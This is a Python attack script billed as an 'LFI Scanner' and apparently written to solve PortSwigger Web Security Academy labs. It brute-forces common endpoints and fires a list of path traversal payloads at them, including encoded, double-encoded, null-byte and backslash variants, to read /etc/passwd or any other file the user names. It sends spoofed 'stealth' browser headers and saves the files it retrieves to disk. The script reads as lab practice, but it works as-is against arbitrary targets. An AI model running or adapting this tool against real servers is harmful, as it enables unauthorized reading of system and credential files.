#!/usr/bin/env python3
import requests
import urllib.parse
import sys
import argparse
from urllib.parse import urljoin, urlparse

def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                    Shadow Junior's LFI Scanner               ║
║                  Advanced Path Traversal Tool               ║
╚══════════════════════════════════════════════════════════════╝
    """)

def exploit_path_traversal(base_url, endpoint, param_name, payload, cookies=None, headers=None):
    """
    Exploit path traversal vulnerability
    """
    try:
        # Construct the full URL
        target_url = urljoin(base_url.rstrip('/') + '/', endpoint.lstrip('/'))

        # Prepare parameters
        params = {param_name: payload}

        # Default headers for stealth
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        if headers:
            default_headers.update(headers)

        print(f"[*] Targeting: {target_url}")
        print(f"[*] Parameter: {param_name}")
        print(f"[*] Payload: {payload}")

        # Send the request
        response = requests.get(
            target_url,
            params=params,
            cookies=cookies,
            headers=default_headers,
            verify=False,
            timeout=10,
            allow_redirects=True
        )

        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Length: {len(response.text)}")

        # Check if the request was successful
        if response.status_code == 200:
            content = response.text

            # Multiple indicators for successful /etc/passwd extraction
            success_indicators = [
                "root:x:0:0",
                "root:*:0:0",
                "daemon:",
                "bin:",
                "sys:",
                "nobody:",
                "/bin/bash",
                "/bin/sh"
            ]

            found_indicators = [indicator for indicator in success_indicators if indicator in content]

            if found_indicators:
                print(f"[+] SUCCESS! Found indicators: {', '.join(found_indicators)}")
                print(f"[+] Retrieved file contents:")
                print("=" * 60)
                print(content)
                print("=" * 60)

                # Save the output to a file
                filename = f"lfi_result_{param_name}.txt"
                with open(filename, "w") as f:
                    f.write(f"URL: {target_url}\n")
                    f.write(f"Parameter: {param_name}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write(f"Status: {response.status_code}\n")
                    f.write("=" * 60 + "\n")
                    f.write(content)

                print(f"[+] Contents saved to {filename}")
                return True
            else:
                print("[-] Target file indicators not found in response")
                # Save response anyway for analysis
                filename = f"lfi_debug_{param_name}.txt"
                with open(filename, "w") as f:
                    f.write(f"URL: {target_url}\n")
                    f.write(f"Parameter: {param_name}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write(f"Status: {response.status_code}\n")
                    f.write("=" * 60 + "\n")
                    f.write(content[:2000] + "..." if len(content) > 2000 else content)
                print(f"[*] Response saved to {filename} for analysis")
                return False
        else:
            print(f"[-] Request failed with status code: {response.status_code}")
            if response.text:
                print(f"[-] Error response: {response.text[:200]}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Request Error: {str(e)}")
        return False
    except Exception as e:
        print(f"[-] Unexpected Error: {str(e)}")
        return False

def discover_endpoints(base_url):
    """
    Discover potential vulnerable endpoints
    """
    common_endpoints = [
        'view',
        'image',
        'file',
        'download',
        'include',
        'page',
        'template',
        'load',
        'read',
        'display'
    ]

    print("[*] Discovering potential endpoints...")
    valid_endpoints = []

    for endpoint in common_endpoints:
        try:
            test_url = urljoin(base_url.rstrip('/') + '/', endpoint)
            response = requests.get(test_url, timeout=5, verify=False)
            if response.status_code not in [404, 403]:
                print(f"[+] Found endpoint: /{endpoint} (Status: {response.status_code})")
                valid_endpoints.append(endpoint)
        except:
            continue

    return valid_endpoints

def main():
    banner()

    parser = argparse.ArgumentParser(description='Advanced LFI Scanner for PortSwigger Labs')
    parser.add_argument('url', help='Target URL (e.g., https://lab-id.web-security-academy.net)')
    parser.add_argument('-e', '--endpoint', default='view', help='Endpoint to test (default: view)')
    parser.add_argument('-p', '--param', default='filename', help='Parameter name (default: filename)')
    parser.add_argument('-t', '--target', default='/etc/passwd', help='Target file (default: /etc/passwd)')
    parser.add_argument('-c', '--cookie', help='Session cookie (format: name=value)')
    parser.add_argument('--discover', action='store_true', help='Discover endpoints first')

    args = parser.parse_args()

    base_url = args.url.rstrip('/')
    endpoint = args.endpoint
    param_name = args.param
    target_file = args.target

    # Parse cookies if provided
    cookies = None
    if args.cookie:
        cookie_parts = args.cookie.split('=', 1)
        if len(cookie_parts) == 2:
            cookies = {cookie_parts[0]: cookie_parts[1]}

    print(f"[*] Target URL: {base_url}")
    print(f"[*] Endpoint: /{endpoint}")
    print(f"[*] Parameter: {param_name}")
    print(f"[*] Target File: {target_file}")

    if args.discover:
        endpoints = discover_endpoints(base_url)
        if endpoints:
            print(f"[*] Testing discovered endpoints: {', '.join(endpoints)}")
        else:
            print("[*] No additional endpoints found, using default")
            endpoints = [endpoint]
    else:
        endpoints = [endpoint]

    # Generate payloads for target file
    payloads = [
        f"../../../../{target_file.lstrip('/')}",
        f"../../../{target_file.lstrip('/')}",
        f"../../{target_file.lstrip('/')}",
        f"../../../../{target_file.lstrip('/')}",
        f"../../../../../{target_file.lstrip('/')}",
        f"../../../../../../{target_file.lstrip('/')}",
        target_file,
        f"./{target_file.lstrip('/')}",
        # URL encoded versions
        urllib.parse.quote(f"../../../../{target_file.lstrip('/')}"),
        # Double URL encoded
        urllib.parse.quote(urllib.parse.quote(f"../../../../{target_file.lstrip('/')}")),
        # Null byte (for older systems)
        f"../../../../{target_file.lstrip('/')}\x00",
        f"../../../../{target_file.lstrip('/')}\x00.txt",
        # Different separators
        f"....//....//....//....//etc//passwd",
        f"..\\..\\..\\..\\etc\\passwd",
    ]

    print(f"\n[*] Testing {len(payloads)} payloads across {len(endpoints)} endpoint(s)")

    success = False
    for test_endpoint in endpoints:
        if success:
            break

        print(f"\n[*] Testing endpoint: /{test_endpoint}")
        for i, payload in enumerate(payloads, 1):
            print(f"\n[*] Payload {i}/{len(payloads)}: {payload[:50]}{'...' if len(payload) > 50 else ''}")

            if exploit_path_traversal(base_url, test_endpoint, param_name, payload, cookies):
                print(f"[+] EXPLOIT SUCCESSFUL!")
                print(f"[+] Working endpoint: /{test_endpoint}")
                print(f"[+] Working parameter: {param_name}")
                print(f"[+] Working payload: {payload}")
                success = True
                break

    if success:
        print(f"\n[+] LAB SOLVED SUCCESSFULLY! 🎯")
    else:
        print(f"\n[-] Exploit failed across all endpoints and payloads")
        print(f"[-] Try different parameters or check if authentication is required")

        # Suggest common parameter names to try
        common_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'folder', 'name']
        print(f"[-] Try these parameter names: {', '.join(common_params)}")

if __name__ == "__main__":
    main()
